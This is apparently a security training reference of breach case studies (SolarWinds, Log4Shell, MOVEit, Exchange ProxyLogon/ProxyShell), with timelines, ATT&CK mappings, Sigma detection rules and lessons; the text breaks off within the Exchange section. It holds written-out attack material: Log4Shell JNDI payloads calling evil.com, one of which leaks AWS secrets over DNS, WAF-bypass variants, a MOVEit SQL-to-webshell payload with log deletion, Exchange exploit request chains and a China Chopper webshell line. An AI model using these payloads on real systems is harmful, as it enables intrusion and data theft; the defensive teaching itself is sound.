<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# Breach Case Studies — Deep Reference
> CIPHER Training Module | Compiled 2026-03-15

---

## Table of Contents

| # | Breach | Year | Primary TTP | Impact Scale |
|---|--------|------|-------------|-------------|
| 1 | [SolarWinds SUNBURST](#1-solarwinds-sunburst-2020) | 2020 | Supply chain compromise | 18,000+ orgs, USG agencies |
| 2 | [Log4Shell](#2-log4shell-cve-2021-44228) | 2021 | JNDI injection RCE | Billions of devices worldwide |
| 3 | [MOVEit Transfer](#3-moveit-transfer-2023) | 2023 | SQLi to RCE | 2,500+ orgs, 66M+ individuals |
| 4 | [Microsoft Exchange ProxyLogon/ProxyShell](#4-microsoft-exchange-proxylogonproxyshell-2021) | 2021 | SSRF chain to RCE | 250,000+ servers exposed |
| 5 | [Uber](#5-uber-2022) | 2022 | MFA fatigue + social engineering | Full internal access |
| 6 | [LastPass](#6-lastpass-2022-2023) | 2022-2023 | Developer workstation compromise | 25M+ user vaults exfiltrated |

---

## Cross-Breach ATT&CK Heat Map

| Tactic | SolarWinds | Log4Shell | MOVEit | Exchange | Uber | LastPass |
|--------|-----------|-----------|--------|----------|------|---------|
| Initial Access | T1195.002 | T1190 | T1190 | T1190 | T1078 + T1621 | T1078 |
| Execution | T1059.001 | T1059.004 | T1059.003 | T1059.001 | T1059 | T1059 |
| Persistence | T1543.003 | T1505.003 | T1505.003 | T1505.003 | — | T1078.004 |
| Privilege Escalation | T1134 | — | T1068 | T1068 | T1078.002 | T1078 |
| Defense Evasion | T1553.002 | T1140 | T1036 | T1036 | T1562 | T1070 |
| Credential Access | T1003 | — | — | T1003.001 | T1621 | T1555 |
| Lateral Movement | T1021.002 | T1210 | — | T1021.001 | T1534 | T1021 |
| Collection | T1560 | — | T1005 | T1114.001 | T1213 | T1530 |
| Exfiltration | T1041 | T1041 | T1041 | T1041 | — | T1537 |
| Impact | — | T1496 | T1486 | — | — | T1485 |

---

## 1. SolarWinds SUNBURST (2020)

### 1.1 Executive Summary

| Attribute | Detail |
|-----------|--------|
| **Threat Actor** | UNC2452 / Nobelium (SVR — Russia) |
| **Campaign Name** | SUNBURST (backdoor), SUNSPOT (build hijack), TEARDROP/RAINDROP (loaders) |
| **Attack Vector** | Supply chain compromise of SolarWinds Orion build pipeline |
| **CVE** | N/A — no vulnerability exploited; build system trojanized |
| **Dwell Time** | ~14 months (Sep 2019 build access → Dec 2020 discovery) |
| **Discovery** | FireEye detected theft of own red team tools |
| **Victims** | 18,000+ Orion customers received trojanized update; ~100 actively exploited |
| **High-Value Targets** | US Treasury, Commerce, DHS, DOE/NNSA, FireEye, Microsoft |

### 1.2 Attack Timeline

| Date | Phase | Event |
|------|-------|-------|
| Oct 2019 | Recon/Test | Attackers inject test code into Orion build (SUNSPOT dry run — benign modification) |
| Feb 2020 | Weaponize | SUNSPOT implant deployed in SolarWinds build environment |
| Mar 2020 | Deliver | Orion version 2019.4 HF 5 ships with SUNBURST DLL (`SolarWinds.Orion.Core.BusinessLayer.dll`) |
| Mar-Jun 2020 | Install | ~18,000 organizations install trojanized update |
| Mar 2020 | C2 Init | SUNBURST activates after 12-14 day dormancy period |
| Mar-Dec 2020 | Operate | Active exploitation of ~100 high-value targets; SAML token forging, lateral movement |
| Jun 2020 | Cleanup | Attackers remove SUNSPOT from build environment |
| Dec 8, 2020 | Detect | FireEye discloses theft of red team tools; attributes to nation-state |
| Dec 13, 2020 | Public | CISA Emergency Directive 21-01; SolarWinds advisory published |
| Dec 15, 2020 | Killswitch | Microsoft, FireEye, GoDaddy sinkhole `avsvmcloud[.]com` C2 domain |
| Jan 2021 | Attribute | NSA/FBI/CISA/ODNI joint statement attributes to Russia (SVR) |

### 1.3 Technical Attack Chain

#### SUNSPOT — Build Hijack

```
Build Server (TeamCity)
    └── SUNSPOT (taskhostsvc.exe) monitors for MsBuild.exe
        └── Detects Orion solution compilation
            └── Replaces InventoryManager.cs source on-disk during build
                └── Injects SUNBURST backdoor code into legitimate DLL
                    └── Original source restored after compilation
                        └── Signed with legitimate SolarWinds certificate
```

**Key evasion**: SUNSPOT used MD5 hash checks to target exact source files, replaced in-memory during compilation, and restored originals — the build server's source control showed no modifications.

#### SUNBURST — Backdoor Behavior

```csharp
// Dormancy check — waits 12-14 days before activation
// Checks for analysis tools before executing
private static bool SearchAssemblies()
{
    // Enumerate running processes — abort if security tools detected:
    // "apimonitor", "dnspy", "fiddler", "wireshark", etc.
    // Check domain — abort if domain contains:
    // "test", "solarwinds", "swdev", "lab"
    // Verify internet connectivity via DNS resolution
}
```

| SUNBURST Feature | Implementation |
|-----------------|----------------|
| **Dormancy** | 12-14 day sleep before C2 contact |
| **Anti-analysis** | Process enumeration for debuggers/security tools |
| **Domain check** | Aborts in SolarWinds dev/test environments |
| **C2 protocol** | DNS (subdomain encoding) → HTTP (after vetting) |
| **DNS C2** | Victim GUID encoded in subdomain of `avsvmcloud[.]com` |
| **HTTP C2** | Mimics legitimate Orion Improvement Program (OIP) traffic |
| **Steganography** | C2 responses hidden in fake XML resembling .NET assemblies |
| **Anti-forensics** | Modifies SolarWinds audit logs, blends with legitimate traffic |

#### Post-Exploitation — SAML Token Forging (Golden SAML)

```
1. Dump AD FS signing certificate (T1552.004)
2. Forge SAML assertions for any federated identity
3. Access M365, Azure AD, on-prem resources as any user
4. No password required — valid signed token accepted everywhere
```

### 1.4 ATT&CK Chain

| Step | Tactic | Technique | Detail |
|------|--------|-----------|--------|
| 1 | Initial Access | T1195.002 — Supply Chain: Software | Trojanized Orion update |
| 2 | Execution | T1059.001 — PowerShell | Post-compromise script execution |
| 3 | Persistence | T1543.003 — Windows Service | SUNBURST runs as SolarWinds service |
| 4 | Defense Evasion | T1553.002 — Code Signing | Signed with legitimate SolarWinds cert |
| 5 | Defense Evasion | T1497.001 — Sandbox Evasion | Process/domain checks before activation |
| 6 | C2 | T1071.004 — DNS | Encoded subdomains to `avsvmcloud[.]com` |
| 7 | C2 | T1071.001 — HTTP | OIP-mimicking HTTPS traffic |
| 8 | Discovery | T1018 — Remote System Discovery | AD/network enumeration |
| 9 | Credential Access | T1552.004 — Private Keys | AD FS token-signing certificate theft |
| 10 | Lateral Movement | T1550.001 — Golden SAML | Forged SAML tokens for federated access |
| 11 | Collection | T1114.002 — Remote Email | M365 mailbox access via forged tokens |
| 12 | Exfiltration | T1041 — C2 Channel | Data exfil over established C2 |

### 1.5 Why Detection Failed

| Detection Gap | Root Cause |
|--------------|------------|
| Build integrity not monitored | No hash verification of source files during CI/CD |
| Signed malware trusted implicitly | Code signing = trust; no behavioral analysis of signed binaries |
| DNS C2 blended with legitimate traffic | Low-volume DNS to plausible domain; no DNS analytics |
| 14-day dormancy defeated sandboxes | Most sandboxes run <10 min; dormancy bypassed all dynamic analysis |
| Orion runs with high privileges by default | Network monitoring tool = broad access by design |
| No SAML token anomaly detection | Golden SAML bypassed MFA and all identity controls |
| SolarWinds excluded from EDR monitoring | Vendor recommendation to exclude Orion directories from AV/EDR |

### 1.6 Detection Opportunities

| Detection Point | Method | Data Source |
|----------------|--------|-------------|
| **DNS anomaly** | New subdomain patterns under `avsvmcloud[.]com`; DGA-like subdomain entropy | DNS logs, passive DNS |
| **Process lineage** | `SolarWinds.BusinessLayerHost.exe` spawning `cmd.exe`, `powershell.exe`, `rundll32.exe` | EDR, Sysmon Event 1 |
| **Named pipe** | SUNBURST creates pipe `583da945-62af-10e8-4902-a8f205c72b2e` | Sysmon Event 17/18 |
| **Build integrity** | Hash mismatch of source files pre/post compilation | CI/CD integrity monitoring |
| **SAML anomaly** | Token lifetime >24h, claims mismatch, token issued without corresponding auth event | Azure AD logs, ADFS logs |
| **Network baseline** | Orion server initiating outbound HTTPS to non-SolarWinds IPs | Firewall logs, NDR |

### 1.7 Sigma Rule — SUNBURST Process Anomaly

```yaml
title: SolarWinds Orion Suspicious Child Process
id: d7a62c12-8e4f-4b3a-9c1d-7f2e6a8b5d4c
status: stable
description: Detects SolarWinds Orion business layer spawning suspicious child processes indicative of SUNBURST backdoor activity
references:
    - https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html
    - https://attack.mitre.org/techniques/T1195/002/
author: CIPHER
date: 2020/12/14
modified: 2026/03/15
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\SolarWinds.BusinessLayerHost.exe'
            - '\SolarWinds.BusinessLayerHostx64.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\rundll32.exe'
            - '\net.exe'
            - '\net1.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\certutil.exe'
    condition: selection_parent and selection_child
falsepositives:
    - SolarWinds Orion legitimate scripted remediation actions (verify with SolarWinds admin)
level: critical
tags:
    - attack.initial_access
    - attack.t1195.002
    - attack.execution
    - attack.t1059.001
```

### 1.8 Lessons Learned

| Lesson | Actionable Takeaway |
|--------|-------------------|
| **Supply chain is a first-class attack vector** | Verify software integrity beyond vendor signatures; implement SBOM tracking |
| **Build systems are crown jewels** | Isolated build environments, reproducible builds, binary provenance (SLSA Level 3+) |
| **Code signing ≠ trust** | Behavioral analysis must apply to signed binaries equally |
| **AV/EDR exclusions are attack surface** | Audit all exclusion paths; treat excluded directories as high-risk |
| **Identity is the new perimeter** | Monitor SAML/OIDC token issuance; detect Golden SAML via token claim anomalies |
| **Dormancy defeats dynamic analysis** | Long-running behavioral monitoring, not just sandboxing |
| **Network monitoring tools are high-value targets** | Segment monitoring infrastructure; apply least privilege to monitoring agents |

---

## 2. Log4Shell (CVE-2021-44228)

### 2.1 Executive Summary

| Attribute | Detail |
|-----------|--------|
| **CVE** | CVE-2021-44228 (CVSS 10.0) |
| **Vulnerability** | JNDI injection in Apache Log4j 2.x (< 2.15.0) |
| **CWE** | CWE-917 (Expression Language Injection) / CWE-502 (Deserialization) |
| **Disclosure** | Nov 24, 2021 (Alibaba Cloud to Apache); public Dec 9, 2021 |
| **Attack Vector** | Any user-controlled string that reaches `log.info()` / `log.error()` etc. |
| **Exploitation Complexity** | Trivial — single string injection |
| **Affected Surface** | Any Java application using Log4j 2.0-beta9 through 2.14.1 |
| **Scope** | Estimated 3+ billion devices running Java; cloud services, embedded systems, enterprise apps |

### 2.2 Attack Timeline

| Date | Phase | Event |
|------|-------|-------|
| Nov 24, 2021 | Report | Alibaba Cloud Security Team reports to Apache |
| Dec 1, 2021 | Exploit ITW | Earliest confirmed exploitation (Minecraft servers, Cloudflare telemetry) |
| Dec 9, 2021 | Public | PoC published; CVE-2021-44228 assigned |
| Dec 10, 2021 | Mass Scan | Global mass scanning begins; 100+ distinct exploit payloads observed within hours |
| Dec 10, 2021 | Patch | Apache releases Log4j 2.15.0 (incomplete fix) |
| Dec 13, 2021 | Bypass | CVE-2021-45046 — bypass of 2.15.0 fix via crafted patterns |
| Dec 14, 2021 | Patch 2 | Apache releases Log4j 2.16.0 (disables JNDI by default) |
| Dec 17, 2021 | DoS | CVE-2021-45105 — DoS via infinite recursion in lookup |
| Dec 28, 2021 | Final | Log4j 2.17.1 — addresses CVE-2021-44832 (RCE via JDBC appender) |
| Jan 2022+ | APT | Chinese, Iranian, North Korean APTs observed exploiting unpatched systems |

### 2.3 Technical Deep Dive

#### Vulnerability Mechanism

```
User input → Application code → log.info(userInput) → Log4j message formatting
    → JNDI Lookup triggered by ${jndi:ldap://attacker.com/exploit}
        → LDAP query to attacker-controlled server
            → Returns serialized Java object / reference
                → Deserialized/loaded on victim → RCE
```

#### Injection Vectors

| Vector | Example Payload | Log4j Sees |
|--------|----------------|------------|
| HTTP Header | `User-Agent: ${jndi:ldap://evil.com/x}` | Logged string triggers lookup |
| URL Path | `/api/${jndi:ldap://evil.com/x}` | 404 handler logs path |
| Form Field | `username=${jndi:ldap://evil.com/x}` | Validation error logged |
| API Body | `{"name":"${jndi:ldap://evil.com/x}"}` | JSON parsing error logged |
| WebSocket | Message containing payload | Chat/messaging logged |

#### JNDI Exploitation Chains

```
Chain 1: LDAP → Remote Classloading (Java < 8u191)
    ${jndi:ldap://attacker:1389/Exploit}
    └── LDAP returns Reference with codebase URL
        └── JVM loads Exploit.class from attacker HTTP server
            └── Static initializer executes → RCE

Chain 2: LDAP → Deserialization Gadgets (any Java version)
    ${jndi:ldap://attacker:1389/serial}
    └── LDAP returns serialized Java object
        └── Gadget chain (Commons-Collections, etc.) triggers on deserialize
            └── Runtime.exec() → RCE

Chain 3: RMI → Remote Classloading
    ${jndi:rmi://attacker:1099/Exploit}
    └── RMI registry returns Reference
        └── Same classloading chain as LDAP

Chain 4: DNS-only (Exfil/Recon)
    ${jndi:dns://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}
    └── DNS lookup leaks environment variables
        └── No RCE but credential theft
```

#### Obfuscation Bypasses for WAFs

```
# Nested lookups — bypass simple string matching
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://evil.com/x}

# Environment variable nesting
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/x}

# Unicode variations
${jndi:ldap://evil.com/\u0061}

# Upper/lower mixing
${${upper:j}${upper:n}${lower:d}${lower:i}:ldap://evil.com/x}

# Default value abuse
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/x}
```

### 2.4 ATT&CK Chain

| Step | Tactic | Technique | Detail |
|------|--------|-----------|--------|
| 1 | Initial Access | T1190 — Exploit Public-Facing App | JNDI injection via any logged input |
| 2 | Execution | T1059.004 — Unix Shell / T1059.001 — PowerShell | Reverse shell via deserialized payload |
| 3 | Defense Evasion | T1140 — Deobfuscate/Decode | Nested lookup obfuscation bypasses WAFs |
| 4 | Persistence | T1505.003 — Web Shell | Webshell dropped post-exploitation |
| 5 | Discovery | T1082 — System Info Discovery | Environment variable exfil via DNS |
| 6 | Credential Access | T1552.001 — Credentials in Files | AWS keys, database creds from env/config |
| 7 | Lateral Movement | T1210 — Exploit Remote Services | Pivot to internal services also running Log4j |
| 8 | Impact | T1496 — Resource Hijacking | Cryptominer deployment (most common) |
| 9 | Impact | T1486 — Data Encrypted | Ransomware (Conti, Khonsari observed) |

### 2.5 Detection Opportunities

| Detection Point | Method | Data Source |
|----------------|--------|-------------|
| **WAF/IDS** | Pattern match for `${jndi:` with obfuscation variants | WAF logs, Suricata |
| **DNS** | Outbound LDAP/RMI DNS lookups from application servers | DNS logs, NDR |
| **Network** | Outbound connections on ports 1389, 1099, 8888 from web-tier | Firewall, flow data |
| **Process** | Java process spawning `/bin/sh`, `/bin/bash`, `cmd.exe` | EDR, Sysmon, auditd |
| **File** | New `.class` files in temp directories | File integrity monitoring |
| **Egress** | LDAP/RMI to external IPs (should never happen from app servers) | NDR, proxy logs |

### 2.6 Sigma Rule — Log4Shell Exploitation Attempt

```yaml
title: Log4Shell JNDI Injection Attempt in Web Logs
id: a3f7c9e2-5b1d-4e8a-b6f3-2d9c8a7e1b5f
status: stable
description: Detects JNDI lookup strings in web server access logs indicating Log4Shell exploitation attempts including common obfuscation techniques
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://logging.apache.org/log4j/2.x/security.html
author: CIPHER
date: 2021/12/10
modified: 2026/03/15
logsource:
    category: webserver
detection:
    selection_plain:
        cs-uri|contains:
            - '${jndi:ldap://'
            - '${jndi:rmi://'
            - '${jndi:dns://'
            - '${jndi:iiop://'
    selection_obfuscated:
        cs-uri|contains:
            - '${${lower:j}'
            - '${${upper:j}'
            - '${${::-j}'
            - '${${env:'
    selection_headers:
        cs-User-Agent|contains:
            - '${jndi:'
        cs-Referer|contains:
            - '${jndi:'
    condition: selection_plain or selection_obfuscated or selection_headers
falsepositives:
    - Security scanners performing authorized vulnerability assessments
level: critical
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2021.44228
```

### 2.7 Sigma Rule — Log4Shell Post-Exploitation

```yaml
title: Java Process Spawning Shell — Potential Log4Shell RCE
id: b8e2d4f1-3a7c-4e9b-8d5f-6c1a2b9e7d3f
status: stable
description: Detects Java processes spawning system shells, indicating successful Log4Shell or similar Java deserialization exploitation
author: CIPHER
date: 2021/12/11
modified: 2026/03/15
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        ParentImage|endswith:
            - '/java'
            - '/javaw'
    selection_child:
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/dash'
            - '/zsh'
            - '/ksh'
            - '/curl'
            - '/wget'
            - '/python'
            - '/python3'
            - '/perl'
    condition: selection_parent and selection_child
falsepositives:
    - Java applications that legitimately execute shell commands (Jenkins build agents, Elasticsearch plugins)
    - Scheduled maintenance scripts invoked through Java-based schedulers
level: high
tags:
    - attack.execution
    - attack.t1059.004
    - cve.2021.44228
```

### 2.8 Lessons Learned

| Lesson | Actionable Takeaway |
|--------|-------------------|
| **Ubiquitous dependencies are systemic risk** | SBOM mandatory; know every transitive dependency in your stack |
| **Logging is an attack surface** | Never pass unsanitized user input to logging frameworks |
| **WAF bypass is trivial with nested encoding** | WAFs are speed bumps, not solutions; patch the vulnerability |
| **Java classloading is inherently dangerous** | Restrict `com.sun.jndi.ldap.object.trustURLCodebase`, use `allowedLdapClasses` |
| **Egress filtering saves you** | Block outbound LDAP/RMI from application servers — zero legitimate reason |
| **Patch is not instant** | Mitigations needed: `-Dlog4j2.formatMsgNoLookups=true`, remove `JndiLookup.class` from JAR |
| **Vulnerability scanners missed embedded Log4j** | Fat JARs, shaded dependencies, containers — scan recursively |

---

## 3. MOVEit Transfer (2023)

### 3.1 Executive Summary

| Attribute | Detail |
|-----------|--------|
| **CVE** | CVE-2023-34362 (CVSS 9.8), CVE-2023-35036, CVE-2023-35708 |
| **Threat Actor** | Cl0p (FIN11 / TA505) |
| **Vulnerability** | SQL injection in MOVEit Transfer web application → RCE |
| **CWE** | CWE-89 (SQL Injection) |
| **Vendor** | Progress Software |
| **Impact** | 2,500+ organizations, 66M+ individuals; $10B+ estimated damages |
| **Exploitation** | Mass exploitation began May 27, 2023 (Memorial Day weekend) |
| **Model** | Extortion-only — no encryption; data theft + leak threat |

### 3.2 Attack Timeline

| Date | Phase | Event |
|------|-------|-------|
| Jul 2021 | Recon | Earliest evidence of Cl0p testing MOVEit SQLi (automated scanning) |
| Apr 2022 | Test | Additional probing activity identified in retrospective analysis |
| Jan 2023 | Test | Cl0p conducts limited manual testing of exploitation chain |
| May 27, 2023 | Exploit | Mass exploitation begins over US Memorial Day weekend |
| May 28-30, 2023 | Exfil | Automated data exfiltration from compromised MOVEit instances |
| May 31, 2023 | Detect | Progress Software notified of zero-day; investigation begins |
| Jun 1, 2023 | Disclose | Progress issues advisory; Mandiant engaged for IR |
| Jun 2, 2023 | Patch | CVE-2023-34362 patch released |
| Jun 5, 2023 | Claim | Cl0p posts on leak site claiming MOVEit victims |
| Jun 9, 2023 | CVE-2 | CVE-2023-35036 — second SQLi discovered during patch review |
| Jun 15, 2023 | CVE-3 | CVE-2023-35708 — third SQLi discovered |
| Jun-Dec 2023 | Extort | Cl0p lists 2,500+ victim organizations; data published for non-payers |

### 3.3 Technical Deep Dive

#### SQL Injection Chain

```
HTTP Request to /moveitisapi/moveitisapi.dll
    └── Parameter injection via crafted request
        └── SQL injection into backend Microsoft SQL Server
            └── xp_cmdshell enabled (if not already)
                └── ASPX webshell (human2.aspx) written to disk
                    └── Webshell provides:
                        ├── File system enumeration
                        ├── Azure Blob Storage config extraction
                        ├── SQL query execution
                        └── Data exfiltration
```

#### Webshell — human2.aspx

```
Key behaviors of the LEMURLOOT webshell:
- Accessed via specific header: X-siLock-Comment with hardcoded key
- Gathers Azure storage account settings from MOVEit database
- Enumerates folders and files in MOVEit
- Retrieves user credentials and account information
- Downloads files in bulk
- Creates new admin accounts for persistence
- Deletes audit logs to cover tracks
```

| Component | Detail |
|-----------|--------|
| **Webshell name** | `human2.aspx` (LEMURLOOT) |
| **Auth mechanism** | Custom header `X-siLock-Comment` with hardcoded value |
| **Location** | `\MOVEitTransfer\wwwroot\` |
| **Capabilities** | File download, DB query, user enum, Azure config theft |
| **Persistence** | New admin account creation via SQL INSERT |
| **Anti-forensics** | Audit log deletion via SQL DELETE from `log` table |
| **Exfil method** | Bulk file download over HTTPS; Azure Storage key theft |

#### SQL Injection Payload (Reconstructed)

```sql
-- Step 1: Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Step 2: Write webshell
EXEC xp_cmdshell 'echo [base64-encoded ASPX] > C:\temp\enc.txt';
EXEC xp_cmdshell 'certutil -decode C:\temp\enc.txt C:\MOVEitTransfer\wwwroot\human2.aspx';

-- Step 3: Clean up
EXEC xp_cmdshell 'del C:\temp\enc.txt';
DELETE FROM [moveittransfer].[dbo].[log] WHERE [Message] LIKE '%human2%';
```

### 3.4 ATT&CK Chain

| Step | Tactic | Technique | Detail |
|------|--------|-----------|--------|
| 1 | Reconnaissance | T1595.002 — Vulnerability Scanning | Automated scanning for MOVEit instances (Shodan: ~2,500 exposed) |
| 2 | Initial Access | T1190 — Exploit Public-Facing App | SQLi in MOVEit Transfer web application |
| 3 | Execution | T1059.003 — Windows Command Shell | `xp_cmdshell` for OS command execution |
| 4 | Persistence | T1505.003 — Web Shell | `human2.aspx` (LEMURLOOT) deployed |
| 5 | Privilege Escalation | T1068 — Exploitation for Privilege Escalation | SQL Server service account → SYSTEM via xp_cmdshell |
| 6 | Defense Evasion | T1070.004 — File Deletion | Cleanup of staging files |
| 7 | Defense Evasion | T1070 — Indicator Removal | Audit log deletion from MOVEit database |
| 8 | Collection | T1005 — Data from Local System | File enumeration and bulk download |
| 9 | Collection | T1530 — Data from Cloud Storage | Azure Blob Storage key extraction |
| 10 | Exfiltration | T1041 — Exfil Over C2 | Bulk HTTPS download via webshell |

### 3.5 Detection Opportunities

| Detection Point | Method | Data Source |
|----------------|--------|-------------|
| **IIS logs** | POST requests to `/moveitisapi/moveitisapi.dll` with SQLi patterns | IIS W3C logs |
| **File creation** | New `.aspx` files in MOVEit web root | Sysmon Event 11, FIM |
| **SQL Server** | `xp_cmdshell` execution by MOVEit service account | SQL Server audit logs |
| **Network** | Large outbound data transfers from MOVEit servers | NDR, NetFlow |
| **Web headers** | Requests containing `X-siLock-Comment` header | WAF, reverse proxy logs |
| **Process tree** | `w3wp.exe` → `cmd.exe` → `certutil.exe` | EDR, Sysmon |
| **DB audit** | DELETE operations on `log` table (anti-forensics indicator) | SQL Server audit |

### 3.6 Sigma Rule — MOVEit Exploitation

```yaml
title: MOVEit Transfer LEMURLOOT Webshell Access
id: c4d8e2f7-1a3b-5c9d-8e6f-2b7a4c1d9e5f
status: stable
description: Detects HTTP requests to known MOVEit webshell filenames or requests containing the X-siLock-Comment authentication header used by LEMURLOOT
references:
    - https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft
    - https://nvd.nist.gov/vuln/detail/CVE-2023-34362
author: CIPHER
date: 2023/06/02
modified: 2026/03/15
logsource:
    category: webserver
    product: iis
detection:
    selection_webshell:
        cs-uri-stem|endswith:
            - '/human2.aspx'
            - '/human2.aspx/'
    selection_header:
        cs(X-siLock-Comment)|contains: '*'
    selection_moveit_sqli:
        cs-uri-stem|contains: '/moveitisapi/moveitisapi.dll'
        cs-uri-query|contains:
            - 'xp_cmdshell'
            - 'sp_configure'
            - 'EXEC+'
    condition: selection_webshell or selection_header or selection_moveit_sqli
falsepositives:
    - Legitimate MOVEit API calls to moveitisapi.dll (filter by query string content)
level: critical
tags:
    - attack.initial_access
    - attack.t1190
    - attack.persistence
    - attack.t1505.003
    - cve.2023.34362
```

### 3.7 Lessons Learned

| Lesson | Actionable Takeaway |
|--------|-------------------|
| **File transfer appliances are high-value targets** | Zero-trust network position: no direct internet exposure; VPN/ZTNA gateway required |
| **Holiday timing is deliberate** | IR staffing plans for holidays; automated detection must compensate for reduced SOC capacity |
| **SQLi in 2023 is inexcusable** | Parameterized queries, WAF with virtual patching, regular code audits for injection |
| **Cl0p pre-positioned for months** | Threat actors test zero-days long before mass exploitation; retroactive hunting matters |
| **Extortion without encryption** | Data theft alone is sufficient for extortion; focus on data access controls, not just ransomware prevention |
| **Supply chain cascade** | One vendor breach cascades to thousands; third-party risk assessments must verify technical controls |
| **Audit log deletion is a detection signal** | Monitor for gaps in audit logs; integrity monitoring on log storage |

---

## 4. Microsoft Exchange ProxyLogon/ProxyShell (2021)

### 4.1 Executive Summary

| Attribute | Detail |
|-----------|--------|
| **Vulnerabilities** | ProxyLogon: CVE-2021-26855 (SSRF), CVE-2021-26857, CVE-2021-26858, CVE-2021-27065 |
|  | ProxyShell: CVE-2021-34473 (SSRF), CVE-2021-34523 (Elevation), CVE-2021-31207 (RCE) |
| **Threat Actors** | Hafnium (China); later: Tick, LuckyMouse, Calypso, Winnti, others |
| **CVSS** | 9.8 (ProxyLogon SSRF), 9.8 (ProxyShell SSRF) |
| **Affected** | All on-premises Exchange Server 2013, 2016, 2019 |
| **Scope** | 250,000+ servers globally; 30,000+ US organizations compromised |
| **Discovery** | Volexity detected in January 2021; DEVCORE reported to Microsoft |

### 4.2 Attack Timeline

| Date | Phase | Event |
|------|-------|-------|
| Dec 2020 | Report | DEVCORE (Orange Tsai) reports ProxyLogon to Microsoft |
| Jan 3, 2021 | Detect | Volexity detects in-the-wild exploitation of Exchange 0-day |
| Jan 6, 2021 | Exploit | Hafnium exploitation activity observed |
| Jan-Feb 2021 | Expand | Limited targeted exploitation by Hafnium (USG, defense, legal, academia) |
| Feb 28, 2021 | Mass | Mass exploitation begins — multiple threat actors pile on |
| Mar 2, 2021 | Patch | Microsoft releases out-of-band patches |
| Mar 2, 2021 | Advisory | CISA Emergency Directive 21-02 |
| Mar 3-5, 2021 | Escalate | Automated webshell deployment hits tens of thousands of servers |
| Mar 15, 2021 | Tool | Microsoft releases one-click mitigation tool (EOMT) |
| Apr 2021 | ProxyShell | Orange Tsai presents new Exchange attack surface at Pwn2Own |
| Jul 2021 | Patch | Microsoft patches ProxyShell (CVE-2021-34473 silently patched in Apr) |
| Aug 2021 | Mass | ProxyShell mass exploitation begins after BlackHat presentation details |

### 4.3 Technical Deep Dive

#### ProxyLogon — SSRF → Auth Bypass → Webshell

```
Step 1: SSRF (CVE-2021-26855)
    POST /ecp/y]<script>alert(1)</script>x HTTP/1.1
    Cookie: X-BEResource=exchange-backend.corp.local/EWS/Exchange.asmx?a=~1942062522
    ├── Exchange CAS proxies request to backend as SYSTEM
    └── X-BEResource cookie controls backend routing → SSRF

Step 2: Arbitrary File Write (CVE-2021-27065)
    POST /ecp/DDI/DDIService.svc/SetObject
    ├── Abuse Virtual Directory configuration
    ├── Set ExternalUrl to contain ASPX webshell code
    └── Reset-OABVirtualDirectory writes config to .aspx file on disk

Step 3: Webshell Access
    GET /owa/auth/[webshell].aspx
    └── Full SYSTEM-level command execution
```

#### ProxyShell — SSRF → Mailbox → RCE

```
Step 1: SSRF + Auth Bypass (CVE-2021-34473)
    GET /autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com
    └── Path confusion in CAS routing bypasses authentication

Step 2: Privilege Escalation (CVE-2021-34523)
    Exchange PowerShell Backend accessed as SYSTEM
    └── -X-Rps-CAT header allows impersonation of any mailbox user

Step 3: RCE via Mailbox Export (CVE-2021-31207)
    New-ManagementRoleAssignment → New-MailboxExportRequest
    └── Export mailbox to .aspx file
        └── Craft email with webshell in body
            └── Export writes webshell to Exchange web directory
```

#### Webshell Variants Observed

| Shell Name | Type | Notes |
|------------|------|-------|
| China Chopper | ASPX one-liner | `<%@Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>` |
| HAFNIUM variants | ASPX | Custom shells with authentication |
| SharPyShell | ASPX | .NET-based with C# execution |
| CashShell | ASPX | Obfuscated variants |
| Proxyshell.aspx | ASPX | Auto-deployed by exploitation toolkits |

### 4.4 ATT&CK Chain

| Step | Tactic | Technique | Detail |
|------|--------|-----------|--------|
| 1 | Initial Access | T1190 — Exploit Public-Facing App | SSRF in Exchange CAS |
| 2 | Execution | T1059.001 — PowerShell | Exchange PowerShell remoting abuse |
| 3 | Persistence | T1505.003 — Web Shell | China Chopper / custom ASPX shells |
| 4 | Privilege Escalation | T1068 — Exploitation for Priv Esc | SYSTEM via CAS-to-backend trust |
| 5 | Defense Evasion | T1036.005 — Match Legitimate Name | Webshells named to blend with Exchange files |
| 6 | Credential Access | T1003.001 — LSASS Memory | `procdump.exe` / `comsvcs.dll` MiniDump |
| 7 | Lateral Movement | T1021.001 — Remote Desktop | RDP with harvested credentials |
| 8 | Collection | T1114.001 — Local Email Collection | Direct mailbox access via EWS |
| 9 | Exfiltration | T1041 — Exfil Over C2 | Data exfiltration via webshell HTTP |

### 4.5 Detection Opportunities

| Detection Point | Method | Data Source |
|----------------|--------|-------------|
| **IIS logs** | POST to `/ecp/DDI/DDIService.svc/SetObject` with OAB virtual directory manipulation | IIS W3C logs |
| **IIS logs** | Autodiscover requests with `@` in path (ProxyShell) | IIS W3C logs |
| **IIS logs** | `X-BEResource` cookie in non-standard requests | IIS W3C logs |
| **File creation** | New `.aspx` files in Exchange web directories (`\FrontEnd\HttpProxy\owa\auth\`) | Sysmon Event 11 |
| **Process tree** | `w3wp.exe` spawning `cmd.exe`, `powershell.exe`, `net.exe` | EDR, Sysmon Event 1 |
